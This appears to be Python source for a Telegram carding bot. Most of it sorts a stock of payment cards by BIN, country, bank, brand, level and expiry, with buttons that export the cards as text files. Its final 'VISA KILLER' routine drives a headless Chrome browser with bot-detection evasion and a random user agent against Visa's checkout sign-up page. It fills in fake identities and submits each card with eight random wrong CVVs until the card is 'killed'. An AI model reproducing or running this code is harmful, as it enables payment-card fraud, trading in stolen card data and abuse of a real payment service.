    bin_items = sorted(by_bin.items(), key=lambda x: len(x[1]), reverse=True)
    
    # Calculate pagination
    items_per_page = 24
    total_pages = (len(bin_items) + items_per_page - 1) // items_per_page
    page = max(0, min(page, total_pages - 1))
    
    start_idx = page * items_per_page
    end_idx = min(start_idx + items_per_page, len(bin_items))
    
    # Create buttons (2 per row)
    keyboard = []
    row = []
    
    for bin_num, cards in bin_items[start_idx:end_idx]:
        btn_text = f"{bin_num} ({len(cards)})"
        callback_data = f"c_sub:b:t:{bin_num}:{session_id}"
        row.append(InlineKeyboardButton(btn_text, callback_data=callback_data))
        
        if len(row) == 2:
            keyboard.append(row)
            row = []
    
    if row:
        keyboard.append(row)
    
    # Add pagination buttons if needed
    if total_pages > 1:
        nav_buttons = []
        if page > 0:
            nav_buttons.append(InlineKeyboardButton("⬅️ Previous", callback_data=f"c_cat:b:{page-1}:{session_id}"))
        nav_buttons.append(InlineKeyboardButton(f"Page {page+1}/{total_pages}", callback_data=f"#"))
        if page < total_pages - 1:
            nav_buttons.append(InlineKeyboardButton("Next ➡️", callback_data=f"c_cat:b:{page+1}:{session_id}"))
        keyboard.append(nav_buttons)
    
    # Add back and search buttons
    keyboard.append([
        InlineKeyboardButton("🔍 Search BIN", callback_data=f"c_bin_search:{session_id}"),
        InlineKeyboardButton("⬅️ Back", callback_data=f"c_back:{session_id}")
    ])
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(
        f"🔢 BIN Categories\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"Found {len(bin_items)} unique BINs\n"
        f"Showing {start_idx+1}-{end_idx} of {len(bin_items)}\n"
        f"Click a BIN to view cards\n\n"
        f"Use 'Search BIN' to find specific BINs",
        reply_markup=reply_markup
    )

async def show_country_category(query, organized_data, session_id, page=0):
    """Show country category with buttons (WITH FLAGS) and pagination"""
    by_country = organized_data['by_country']
    
    # Sort countries by count
    country_items = sorted(by_country.items(), key=lambda x: len(x[1]), reverse=True)
    
    # Calculate pagination
    items_per_page = 24
    total_pages = (len(country_items) + items_per_page - 1) // items_per_page
    page = max(0, min(page, total_pages - 1))
    
    start_idx = page * items_per_page
    end_idx = min(start_idx + items_per_page, len(country_items))
    
    # Create buttons (2 per row) with flags
    keyboard = []
    row = []
    
    for country, cards in country_items[start_idx:end_idx]:
        # Get flag for this country
        flag = ""
        if cards:
            flag = cards[0].get('country_flag', '')
        
        # Shorten country name if too long
        country_name = country[:10] + "..." if len(country) > 10 else country
        
        # Create button text with flag
        btn_text = f"{flag} {country_name} ({len(cards)})"
        callback_data = f"c_sub:co:t:{country[:20]}:{session_id}"
        row.append(InlineKeyboardButton(btn_text, callback_data=callback_data))
        
        if len(row) == 2:
            keyboard.append(row)
            row = []
    
    if row:
        keyboard.append(row)
    
    # Add pagination buttons if needed
    if total_pages > 1:
        nav_buttons = []
        if page > 0:
            nav_buttons.append(InlineKeyboardButton("⬅️ Previous", callback_data=f"c_cat:co:{page-1}:{session_id}"))
        nav_buttons.append(InlineKeyboardButton(f"Page {page+1}/{total_pages}", callback_data=f"#"))
        if page < total_pages - 1:
            nav_buttons.append(InlineKeyboardButton("Next ➡️", callback_data=f"c_cat:co:{page+1}:{session_id}"))
        keyboard.append(nav_buttons)
    
    # Add back button
    keyboard.append([InlineKeyboardButton("⬅️ Back", callback_data=f"c_back:{session_id}")])
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(
        f"🌍 Country Categories\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"Found {len(country_items)} countries\n"
        f"Showing {start_idx+1}-{end_idx} of {len(country_items)}\n"
        f"Click a country to view cards",
        reply_markup=reply_markup
    )

async def show_type_category(query, organized_data, session_id, page=0):
    """Show card type category with buttons and pagination"""
    by_type = organized_data['by_type']
    
    # Sort types by count
    type_items = sorted(by_type.items(), key=lambda x: len(x[1]), reverse=True)
    
    # Calculate pagination
    items_per_page = 20
    total_pages = (len(type_items) + items_per_page - 1) // items_per_page
    page = max(0, min(page, total_pages - 1))
    
    start_idx = page * items_per_page
    end_idx = min(start_idx + items_per_page, len(type_items))
    
    # Create buttons (1 per row)
    keyboard = []
    
    for card_type, cards in type_items[start_idx:end_idx]:
        btn_text = f"{card_type[:15]} ({len(cards)})"
        callback_data = f"c_sub:t:t:{card_type[:20]}:{session_id}"
        keyboard.append([InlineKeyboardButton(btn_text, callback_data=callback_data)])
    
    # Add pagination buttons if needed
    if total_pages > 1:
        nav_buttons = []
        if page > 0:
            nav_buttons.append(InlineKeyboardButton("⬅️ Previous", callback_data=f"c_cat:t:{page-1}:{session_id}"))
        nav_buttons.append(InlineKeyboardButton(f"Page {page+1}/{total_pages}", callback_data=f"#"))
        if page < total_pages - 1:
            nav_buttons.append(InlineKeyboardButton("Next ➡️", callback_data=f"c_cat:t:{page+1}:{session_id}"))
        keyboard.append(nav_buttons)
    
    # Add back button
    keyboard.append([InlineKeyboardButton("⬅️ Back", callback_data=f"c_back:{session_id}")])
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(
        f"💳 Card Type Categories\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"Found {len(type_items)} card types\n"
        f"Showing {start_idx+1}-{end_idx} of {len(type_items)}\n"
        f"Click a type to view cards",
        reply_markup=reply_markup
    )

async def show_level_category(query, organized_data, session_id, page=0):
    """Show card level category with buttons and pagination"""
    by_level = organized_data['by_level']
    
    # Sort levels by count
    level_items = sorted(by_level.items(), key=lambda x: len(x[1]), reverse=True)
    
    # Calculate pagination
    items_per_page = 20
    total_pages = (len(level_items) + items_per_page - 1) // items_per_page
    page = max(0, min(page, total_pages - 1))
    
    start_idx = page * items_per_page
    end_idx = min(start_idx + items_per_page, len(level_items))
    
    # Create buttons (1 per row)
    keyboard = []
    
    for level, cards in level_items[start_idx:end_idx]:
        display_level = level if level != "" else "Unknown"
        btn_text = f"{display_level[:15]} ({len(cards)})"
        callback_data = f"c_sub:l:t:{level[:20]}:{session_id}"
        keyboard.append([InlineKeyboardButton(btn_text, callback_data=callback_data)])
    
    # Add pagination buttons if needed
    if total_pages > 1:
        nav_buttons = []
        if page > 0:
            nav_buttons.append(InlineKeyboardButton("⬅️ Previous", callback_data=f"c_cat:l:{page-1}:{session_id}"))
        nav_buttons.append(InlineKeyboardButton(f"Page {page+1}/{total_pages}", callback_data=f"#"))
        if page < total_pages - 1:
            nav_buttons.append(InlineKeyboardButton("Next ➡️", callback_data=f"c_cat:l:{page+1}:{session_id}"))
        keyboard.append(nav_buttons)
    
    # Add back button
    keyboard.append([InlineKeyboardButton("⬅️ Back", callback_data=f"c_back:{session_id}")])
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(
        f"⭐ Card Level Categories\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"Found {len(level_items)} card levels\n"
        f"Showing {start_idx+1}-{end_idx} of {len(level_items)}\n"
        f"Click a level to view cards",
        reply_markup=reply_markup
    )

async def show_brand_category(query, organized_data, session_id, page=0):
    """Show brand category with buttons and pagination"""
    by_brand = organized_data['by_brand']
    
    # Sort brands by count
    brand_items = sorted(by_brand.items(), key=lambda x: len(x[1]), reverse=True)
    
    # Calculate pagination
    items_per_page = 24
    total_pages = (len(brand_items) + items_per_page - 1) // items_per_page
    page = max(0, min(page, total_pages - 1))
    
    start_idx = page * items_per_page
    end_idx = min(start_idx + items_per_page, len(brand_items))
    
    # Create buttons (2 per row)
    keyboard = []
    row = []
    
    for brand, cards in brand_items[start_idx:end_idx]:
        btn_text = f"{brand[:10]} ({len(cards)})"
        callback_data = f"c_sub:br:t:{brand[:20]}:{session_id}"
        row.append(InlineKeyboardButton(btn_text, callback_data=callback_data))
        
        if len(row) == 2:
            keyboard.append(row)
            row = []
    
    if row:
        keyboard.append(row)
    
    # Add pagination buttons if needed
    if total_pages > 1:
        nav_buttons = []
        if page > 0:
            nav_buttons.append(InlineKeyboardButton("⬅️ Previous", callback_data=f"c_cat:br:{page-1}:{session_id}"))
        nav_buttons.append(InlineKeyboardButton(f"Page {page+1}/{total_pages}", callback_data=f"#"))
        if page < total_pages - 1:
            nav_buttons.append(InlineKeyboardButton("Next ➡️", callback_data=f"c_cat:br:{page+1}:{session_id}"))
        keyboard.append(nav_buttons)
    
    # Add back button
    keyboard.append([InlineKeyboardButton("⬅️ Back", callback_data=f"c_back:{session_id}")])
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(
        f"🏦 Brand Categories\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"Found {len(brand_items)} brands\n"
        f"Showing {start_idx+1}-{end_idx} of {len(brand_items)}\n"
        f"Click a brand to view cards",
        reply_markup=reply_markup
    )

async def show_expiry_category(query, organized_data, session_id, page=0):
    """Show expiry category with years - FIXED CALLBACK DATA"""
    by_year_month = organized_data['by_year_month']
    
    # Sort years
    year_items = sorted(by_year_month.items(), key=lambda x: x[0])
    
    # Create buttons (2 per row) - FIXED CALLBACK DATA FORMAT
    keyboard = []
    row = []
    
    for year, months in year_items:
        # Count total cards for this year
        year_total = sum(len(cards) for cards in months.values())
        btn_text = f"{year} ({year_total})"
        # FIXED: Correct format for year selection
        callback_data = f"c_sub:ey:v:{year}:{session_id}"
        row.append(InlineKeyboardButton(btn_text, callback_data=callback_data))
        
        if len(row) == 2:
            keyboard.append(row)
            row = []
    
    if row:
        keyboard.append(row)
    
    # Add back button
    keyboard.append([InlineKeyboardButton("⬅️ Back", callback_data=f"c_back:{session_id}")])
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(
        f"📅 Expiry Year Categories\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"Found {len(year_items)} expiry years\n"
        f"Click a year to view months",
        reply_markup=reply_markup
    )

async def show_bank_category(query, organized_data, session_id, page=0):
    """Show bank category with buttons and pagination"""
    by_bank = organized_data['by_bank']
    
    # Sort banks by count
    bank_items = sorted(by_bank.items(), key=lambda x: len(x[1]), reverse=True)
    
    # Calculate pagination
    items_per_page = 20
    total_pages = (len(bank_items) + items_per_page - 1) // items_per_page
    page = max(0, min(page, total_pages - 1))
    
    start_idx = page * items_per_page
    end_idx = min(start_idx + items_per_page, len(bank_items))
    
    # Create buttons (1 per row)
    keyboard = []
    
    for bank, cards in bank_items[start_idx:end_idx]:
        btn_text = f"{bank[:15]} ({len(cards)})"
        callback_data = f"c_sub:bank:t:{bank[:20]}:{session_id}"
        keyboard.append([InlineKeyboardButton(btn_text, callback_data=callback_data)])
    
    # Add pagination buttons if needed
    if total_pages > 1:
        nav_buttons = []
        if page > 0:
            nav_buttons.append(InlineKeyboardButton("⬅️ Previous", callback_data=f"c_cat:bank:{page-1}:{session_id}"))
        nav_buttons.append(InlineKeyboardButton(f"Page {page+1}/{total_pages}", callback_data=f"#"))
        if page < total_pages - 1:
            nav_buttons.append(InlineKeyboardButton("Next ➡️", callback_data=f"c_cat:bank:{page+1}:{session_id}"))
        keyboard.append(nav_buttons)
    
    # Add back button
    keyboard.append([InlineKeyboardButton("⬅️ Back", callback_data=f"c_back:{session_id}")])
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(
        f"🏦 Bank Categories\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"Found {len(bank_items)} banks\n"
        f"Showing {start_idx+1}-{end_idx} of {len(bank_items)}\n"
        f"Click a bank to view cards",
        reply_markup=reply_markup
    )

async def show_all_cards(query, organized_data, session_id):
    """Show all cards with export options - FIXED"""
    all_cards = organized_data['all_cards']
    total_cards = len(all_cards)
    
    # Create export buttons (2 per row) - FIXED: Use 'a' as category for 'all'
    keyboard = [
        [
            InlineKeyboardButton("📄 Get TXT", callback_data=f"c_exp:1:a:t:all:{session_id}"),
            InlineKeyboardButton("📄+🗑️ TXT & Remove", callback_data=f"c_exp:2:a:t:all:{session_id}")
        ],
        [InlineKeyboardButton("⬅️ Back", callback_data=f"c_back:{session_id}")]
    ]
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(
        f"📋 All Cards\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"Total cards: {total_cards:,}\n\n"
        f"📁 Export Options\n"
        f"• 📄 Get TXT - Download all cards as text file\n"
        f"• 📄+🗑️ TXT & Remove - Download and mark as exported",
        reply_markup=reply_markup
    )

async def show_bin_details(query, organized_data, bin_num, session_id):
    """Show details for a specific BIN"""
    cards = organized_data['by_bin'].get(bin_num, [])
    
    if not cards:
        await query.answer("❌ No cards found for this BIN", show_alert=True)
        return
    
    # Get sample card for BIN info
    sample_card = cards[0]
    
    # Create export buttons (2 per row) - FIXED CALLBACK DATA
    keyboard = [
        [
            InlineKeyboardButton("📄 Get TXT", callback_data=f"c_exp:1:b:t:{bin_num}:{session_id}"),
            InlineKeyboardButton("📄+🗑️ TXT & Remove", callback_data=f"c_exp:2:b:t:{bin_num}:{session_id}")
        ],
        [InlineKeyboardButton("⬅️ Back to BINs", callback_data=f"c_cat:b:0:{session_id}")]
    ]
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    # Get BIN info if not loaded
    bin_info = sample_card.get('bin_info', '')
    brand = sample_card.get('brand', 'Unknown')
    card_type = sample_card.get('type', 'Unknown')
    country = sample_card.get('country', 'Unknown')
    country_flag = sample_card.get('country_flag', '')
    bank = sample_card.get('bank', 'Unknown')
    level = sample_card.get('level', '')
    
    # If BIN info not loaded, try to get it
    if not bin_info or brand == 'Unknown':
        try:
            bin_info, details = get_bin_info(bin_num)
            brand = details.get('brand', 'Unknown')
            card_type = details.get('type', 'Unknown')
            country = details.get('country', 'Unknown')
            country_flag = details.get('country_flag', '')
            bank = details.get('bank', 'Unknown')
            level = details.get('level', '')
        except:
            pass
    
    await query.edit_message_text(
        f"🔢 BIN Details\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"BIN: {bin_num}\n"
        f"Info: {bin_info}{(' ' + country_flag) if country_flag else ''}\n"
        f"Brand: {brand}\n"
        f"Type: {card_type}\n"
        f"Country: {country_flag} {country}\n"
        f"Bank: {bank}\n"
        f"Level: {level or 'N/A'}\n\n"
        f"📊 Cards found: {len(cards):,}\n\n"
        f"📁 Export Options",
        reply_markup=reply_markup
    )

async def show_country_details(query, organized_data, country, session_id):
    """Show details for a specific country (WITH FLAG)"""
    cards = organized_data['by_country'].get(country, [])
    
    if not cards:
        await query.answer("❌ No cards found for this country", show_alert=True)
        return
    
    # Get flag for country
    flag = ""
    if cards:
        flag = cards[0].get('country_flag', '')
    
    # Count unique BINs in this country
    unique_bins = set(card['bin'] for card in cards)
    
    # Create export buttons (2 per row) - FIXED CALLBACK DATA
    keyboard = [
        [
            InlineKeyboardButton("📄 Get TXT", callback_data=f"c_exp:1:co:t:{country[:20]}:{session_id}"),
            InlineKeyboardButton("📄+🗑️ TXT & Remove", callback_data=f"c_exp:2:co:t:{country[:20]}:{session_id}")
        ],
        [InlineKeyboardButton("⬅️ Back to Countries", callback_data=f"c_cat:co:0:{session_id}")]
    ]
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(
        f"🌍 Country Details\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"Country: {flag} {country}\n"
        f"Total cards: {len(cards):,}\n"
        f"Unique BINs: {len(unique_bins)}\n"
        f"Top BINs: {', '.join(list(unique_bins)[:5])}\n\n"
        f"📁 Export Options",
        reply_markup=reply_markup
    )

async def show_type_details(query, organized_data, card_type, session_id):
    """Show details for a specific card type"""
    cards = organized_data['by_type'].get(card_type, [])
    
    if not cards:
        await query.answer("❌ No cards found for this type", show_alert=True)
        return
    
    # Create export buttons (2 per row) - FIXED CALLBACK DATA
    keyboard = [
        [
            InlineKeyboardButton("📄 Get TXT", callback_data=f"c_exp:1:t:t:{card_type[:20]}:{session_id}"),
            InlineKeyboardButton("📄+🗑️ TXT & Remove", callback_data=f"c_exp:2:t:t:{card_type[:20]}:{session_id}")
        ],
        [InlineKeyboardButton("⬅️ Back to Types", callback_data=f"c_cat:t:0:{session_id}")]
    ]
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(
        f"💳 Card Type Details\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"Type: {card_type}\n"
        f"Total cards: {len(cards):,}\n\n"
        f"📁 Export Options",
        reply_markup=reply_markup
    )

async def show_level_details(query, organized_data, level, session_id):
    """Show details for a specific card level"""
    cards = organized_data['by_level'].get(level, [])
    display_level = level if level != "" else "Unknown"
    
    if not cards:
        await query.answer("❌ No cards found for this level", show_alert=True)
        return
    
    # Create export buttons (2 per row) - FIXED CALLBACK DATA
    keyboard = [
        [
            InlineKeyboardButton("📄 Get TXT", callback_data=f"c_exp:1:l:t:{level[:20]}:{session_id}"),
            InlineKeyboardButton("📄+🗑️ TXT & Remove", callback_data=f"c_exp:2:l:t:{level[:20]}:{session_id}")
        ],
        [InlineKeyboardButton("⬅️ Back to Levels", callback_data=f"c_cat:l:0:{session_id}")]
    ]
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(
        f"⭐ Card Level Details\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"Level: {display_level}\n"
        f"Total cards: {len(cards):,}\n\n"
        f"📁 Export Options",
        reply_markup=reply_markup
    )

async def show_brand_details(query, organized_data, brand, session_id):
    """Show details for a specific brand"""
    cards = organized_data['by_brand'].get(brand, [])
    
    if not cards:
        await query.answer("❌ No cards found for this brand", show_alert=True)
        return
    
    # Count unique countries for this brand
    unique_countries = set(card['country'] for card in cards)
    
    # Create export buttons (2 per row) - FIXED CALLBACK DATA
    keyboard = [
        [
            InlineKeyboardButton("📄 Get TXT", callback_data=f"c_exp:1:br:t:{brand[:20]}:{session_id}"),
            InlineKeyboardButton("📄+🗑️ TXT & Remove", callback_data=f"c_exp:2:br:t:{brand[:20]}:{session_id}")
        ],
        [InlineKeyboardButton("⬅️ Back to Brands", callback_data=f"c_cat:br:0:{session_id}")]
    ]
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(
        f"🏦 Brand Details\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"Brand: {brand}\n"
        f"Total cards: {len(cards):,}\n"
        f"Countries: {len(unique_countries)}\n"
        f"Sample countries: {', '.join(list(unique_countries)[:5])}\n\n"
        f"📁 Export Options",
        reply_markup=reply_markup
    )

async def show_bank_details(query, organized_data, bank, session_id):
    """Show details for a specific bank"""
    cards = organized_data['by_bank'].get(bank, [])
    
    if not cards:
        await query.answer("❌ No cards found for this bank", show_alert=True)
        return
    
    # Count unique BINs for this bank
    unique_bins = set(card['bin'] for card in cards)
    
    # Create export buttons (2 per row) - FIXED CALLBACK DATA
    keyboard = [
        [
            InlineKeyboardButton("📄 Get TXT", callback_data=f"c_exp:1:bank:t:{bank[:20]}:{session_id}"),
            InlineKeyboardButton("📄+🗑️ TXT & Remove", callback_data=f"c_exp:2:bank:t:{bank[:20]}:{session_id}")
        ],
        [InlineKeyboardButton("⬅️ Back", callback_data=f"c_back:{session_id}")]
    ]
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(
        f"🏦 Bank Details\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"Bank: {bank}\n"
        f"Total cards: {len(cards):,}\n"
        f"Unique BINs: {len(unique_bins)}\n\n"
        f"📁 Export Options",
        reply_markup=reply_markup
    )

async def show_expiry_year_details(query, organized_data, year, session_id):
    """Show details for a specific expiry year with months - FIXED"""
    try:
        year_int = int(year)
    except:
        await query.answer("❌ Invalid year", show_alert=True)
        return
    
    by_year_month = organized_data['by_year_month']
    
    if year_int not in by_year_month:
        await query.answer("❌ No cards found for this year", show_alert=True)
        return
    
    months_data = by_year_month[year_int]
    
    # Sort months
    month_items = sorted(months_data.items(), key=lambda x: int(x[0]))
    
    # Month names for display
    month_names = {
        "01": "Jan", "02": "Feb", "03": "Mar", "04": "Apr",
        "05": "May", "06": "Jun", "07": "Jul", "08": "Aug",
        "09": "Sep", "10": "Oct", "11": "Nov", "12": "Dec"
    }
    
    # Create buttons for months (2 per row) - FIXED: Proper callback data format
    keyboard = []
    row = []
    
    for month, cards in month_items:
        month_name = month_names.get(month, month)
        btn_text = f"{month_name} ({len(cards)})"
        # FIXED: Correct format for year-month selection - c_sub:category:sub_type:identifier:extra:session_id
        callback_data = f"c_sub:ym:ym:{year}:{month}:{session_id}"
        row.append(InlineKeyboardButton(btn_text, callback_data=callback_data))
        
        if len(row) == 2:
            keyboard.append(row)
            row = []
    
    if row:
        keyboard.append(row)
    
    # Add export and back buttons
    keyboard.append([
        InlineKeyboardButton("📄 Export Year", callback_data=f"c_exp:1:ey:v:{year}:{session_id}")
    ])
    keyboard.append([InlineKeyboardButton("⬅️ Back to Years", callback_data=f"c_cat:e:0:{session_id}")])
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    # Calculate total for year
    year_total = sum(len(cards) for cards in months_data.values())
    
    await query.edit_message_text(
        f"📅 Expiry Year Details\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"Year: {year}\n"
        f"Total cards: {year_total:,}\n\n"
        f"📅 Months in {year}:",
        reply_markup=reply_markup
    )

async def show_year_month_details(query, organized_data, year, month, session_id):
    """Show details for a specific month in a specific year - FIXED"""
    by_year_month = organized_data['by_year_month']
    
    try:
        year_int = int(year)
    except:
        await query.answer("❌ Invalid year", show_alert=True)
        return
    
    if year_int not in by_year_month or month not in by_year_month[year_int]:
        await query.answer("❌ No cards found for this month-year combination", show_alert=True)
        return
    
    cards = by_year_month[year_int][month]
    
    if not cards:
        await query.answer("❌ No cards found for this month", show_alert=True)
        return
    
    # Month name for display
    month_names = {
        "01": "January", "02": "February", "03": "March", "04": "April",
        "05": "May", "06": "June", "07": "July", "08": "August",
        "09": "September", "10": "October", "11": "November", "12": "December"
    }
    month_name = month_names.get(month, f"Month {month}")
    
    # Create export buttons with CORRECT callback data format
    keyboard = [
        [
            InlineKeyboardButton("📄 Get TXT", callback_data=f"c_exp:1:ym:ym:{year}:{month}:{session_id}"),
            InlineKeyboardButton("📄+🗑️ TXT & Remove", callback_data=f"c_exp:2:ym:ym:{year}:{month}:{session_id}")
        ],
        [InlineKeyboardButton("⬅️ Back to Months", callback_data=f"c_sub:ey:v:{year}:{session_id}")]
    ]
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(
        f"📅 Year-Month Details\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"Year: {year}\n"
        f"Month: {month_name} ({month})\n"
        f"Total cards: {len(cards):,}\n\n"
        f"📁 Export Options",
        reply_markup=reply_markup
    )

async def show_expiry_month_details(query, organized_data, month, session_id):
    """Show details for a specific expiry month"""
    cards = organized_data['by_expiry_month'].get(month, [])
    
    if not cards:
        await query.answer("❌ No cards found for this month", show_alert=True)
        return
    
    # Count years in this month
    year_counts = {}
    for card in cards:
        year = card['full_year']
        year_counts[year] = year_counts.get(year, 0) + 1
    
    # Sort years
    sorted_years = sorted(year_counts.items(), key=lambda x: x[0])
    
    # Month name for display
    month_names = {
        "01": "January", "02": "February", "03": "March", "04": "April",
        "05": "May", "06": "June", "07": "July", "08": "August",
        "09": "September", "10": "October", "11": "November", "12": "December"
    }
    month_name = month_names.get(month, f"Month {month}")
    
    # Create export buttons (2 per row) - FIXED CALLBACK DATA
    keyboard = [
        [
            InlineKeyboardButton("📄 Get TXT", callback_data=f"c_exp:1:em:v:{month}:{session_id}"),
            InlineKeyboardButton("📄+🗑️ TXT & Remove", callback_data=f"c_exp:2:em:v:{month}:{session_id}")
        ],
        [InlineKeyboardButton("⬅️ Back", callback_data=f"c_back:{session_id}")]
    ]
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    year_details = "\n".join([f"• {year}: {count:,} cards" for year, count in sorted_years])
    
    await query.edit_message_text(
        f"📅 Expiry Month Details\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"Month: {month_name} ({month})\n"
        f"Total cards: {len(cards):,}\n\n"
        f"📅 Year distribution:\n{year_details}\n\n"
        f"📁 Export Options",
        reply_markup=reply_markup
    )

# ==== 5. VISA KILLER (Auto-adjust wait) ====
def run_selenium_process(card_input, update_dict):
    asyncio.run(fill_checkout_form(card_input, update_dict))

async def fill_checkout_form(card_input, update_dict):
    uid = update_dict["user_id"]
    chat_id = update_dict["chat_id"]
    msg_id = update_dict["message_id"]
    bot = Bot(BOT_TOKEN)

    if not is_approved(uid, "kill"):
        await bot.edit_message_text(chat_id=chat_id, message_id=msg_id, text="🚫 You are not approved to use the bot.")
        return
    
    if not is_cmd_enabled("kill"):
        await bot.edit_message_text(chat_id=chat_id, message_id=msg_id, text="⚠️ This command is currently disabled by admin.")
        return

    parsed = parse_card_input(card_input)
    if not parsed:
        await bot.edit_message_text(
            chat_id=chat_id, message_id=msg_id,
            text="❌ Invalid format. Use: `/kill 1234567812345678|12|2026|123`",
            parse_mode="Markdown"
        )
        return

    card, mm, yy, original_cvv = parsed
    short_card = f"{card}|{mm}|{yy}|{original_cvv}"
    bin_info, bin_details = get_bin_info(card[:6])
    bin_flag = (bin_details or {}).get("country_flag", "")

    await bot.edit_message_text(
        chat_id=chat_id,
        message_id=msg_id,
        text=f"💳 `{short_card}`\n🔁 Starting VISA kill automation...",
        parse_mode="Markdown"
    )

    start = time.time()

    first_name = names.get_first_name()
    last_name = names.get_last_name()
    email = f"{first_name.lower()}{random.randint(1000,9999)}@example.com"

    # Optimized Chrome options for Railway
    ua = UserAgent()
    options = webdriver.ChromeOptions()
    options.binary_location = CHROME_PATH
    options.add_argument(f"user-agent={ua.random}")
    options.add_argument("--headless=new")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument("--disable-gpu")
    options.add_argument("--disable-extensions")
    options.add_argument("--disable-software-rasterizer")
    options.add_argument("--disable-background-networking")
    options.add_argument("--disable-default-apps")
    options.add_argument("--disable-sync")
    options.add_argument("--no-first-run")
    options.add_argument("--window-size=1920,1080")
    options.add_argument("--disable-blink-features=AutomationControlled")
    options.add_experimental_option("excludeSwitches", ["enable-automation"])
    options.add_experimental_option('useAutomationExtension', False)
    options.set_capability("pageLoadStrategy", "eager")

    service = Service(executable_path=CHROME_DRIVER_PATH)
    driver = webdriver.Chrome(service=service, options=options)
    driver.set_page_load_timeout(25)
    wait = WebDriverWait(driver, 15)

    try:
        driver.get("https://secure.checkout.visa.com/createAccount")

        wait.until(EC.element_to_be_clickable((By.ID, "firstName"))).send_keys(first_name)
        driver.find_element(By.ID, "lastName").send_keys(last_name)
        driver.find_element(By.ID, "emailAddress").send_keys(email)

        ActionChains(driver).move_to_element(
            wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, "input.viewButton-button[value='Set Up']")))
        ).click().perform()

        wait.until(EC.element_to_be_clickable((By.ID, "cardNumber-CC"))).send_keys(card)
        driver.find_element(By.ID, "expiry").send_keys(f"{mm}/{yy}")
        driver.find_element(By.ID, "addCardCVV").send_keys(get_random_cvv(original_cvv))

        driver.find_element(By.ID, "first_name").send_keys(first_name)
        driver.find_element(By.ID, "last_name").send_keys(last_name)
        driver.find_element(By.ID, "address_line1").send_keys("123 Elm Street")
        driver.find_element(By.ID, "address_city").send_keys("New York")
        driver.find_element(By.ID, "address_state_province_code").send_keys("NY")
        driver.find_element(By.ID, "address_postal_code").send_keys("10001")
        driver.find_element(By.ID, "address_phone").send_keys("2025550104")

        try:
            driver.execute_script("arguments[0].click();", driver.find_element(By.ID, "country_code"))
            wait.until(EC.element_to_be_clickable((By.ID, "rf-combobox-1-item-1"))).click()
        except:
            pass

        ActionChains(driver).move_to_element(
            wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, "input.viewButton-button[value='Finish Setup']")))
        ).click().perform()

        used_cvvs = set()
        logs = []
        for attempt in range(8):
            try:
                new_cvv = get_random_cvv(original_cvv, used_cvvs)

                # Wait for CVV field to be ready
                input_field = wait.until(EC.element_to_be_clickable((By.ID, "addCardCVV")))
                input_field.clear()
                input_field.send_keys(new_cvv)

                # Click Finish Setup
                finish_btn = wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, "input.viewButton-button[value='Finish Setup']")))
                finish_btn.click()

                logs.append(f"• Try {attempt+1}: {new_cvv}")

                # Auto-adjust wait: wait until CVV field is clickable again
                wait.until(EC.element_to_be_clickable((By.ID, "addCardCVV")))

            except:
                logs.append(f"• Failed attempt {attempt+1}")

        duration = round(time.time() - start, 2)
        await bot.edit_message_text(
            chat_id=chat_id,
            message_id=msg_id,
            text=(
                f"💳 **Card:** `{short_card}`\n"
                f"🏦 **BIN:** `{bin_info}` {bin_flag}\n\n"
                f"🔁 **CVV Attempts:**\n" + "\n".join(logs) + "\n\n"
                f"✅ **Status:** Killed Successfully\n"
                f"⏱ **Time:** {duration}s"
            ),
            parse_mode="Markdown"
        )
        record_cmd_success("kill")

    except Exception:
        screenshot = "fail.png"
        driver.save_screenshot(screenshot)
        err_trace = traceback.format_exc()
        record_cmd_failure("kill")

        await bot.edit_message_text(chat_id=chat_id, message_id=msg_id, text="❌ VISA Kill failed.")
        await bot.send_photo(
            chat_id=BOT_ADMIN_ID,
            photo=open(screenshot, "rb"),
            caption=f"```\n{err_trace}\n```",
            parse_mode="Markdown"
        )
        os.remove(screenshot)

    finally:
        try:
            driver.quit()
        except:
            pass
        driver = None
        gc.collect()

